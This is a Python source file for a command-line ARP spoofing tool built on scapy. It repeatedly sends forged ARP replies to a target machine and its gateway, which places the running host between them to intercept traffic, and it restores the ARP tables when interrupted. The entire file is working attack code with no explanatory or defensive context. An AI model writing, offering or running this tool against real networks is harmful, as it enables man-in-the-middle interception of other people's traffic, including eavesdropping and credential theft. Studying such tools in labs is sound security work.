import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    """
    Queries and returns the MAC address for the given IP address.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofer(target_ip, spoof_ip):
    """
    Sends a spoofed ARP response to the target IP.
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the ARP table values for the given IP addresses.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool')
    parser.add_argument('target_ip', type=str, help='The IP address of the target machine.')
    parser.add_argument('gateway_ip', type=str, help='The IP address of the gateway.')
    args = parser.parse_args()

    packets_sent = 0
    try:
        while True:
            spoofer(args.target_ip, args.gateway_ip)
            spoofer(args.gateway_ip, args.target_ip)
            packets_sent += 2
            print(f"\r[+] Packets sent: {packets_sent}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterrupted Spoofing found CTRL + C - Restoring ARP tables... Please wait.")
        restore(args.target_ip, args.gateway_ip)
        restore(args.gateway_ip, args.target_ip)

if __name__ == "__main__":
    main()
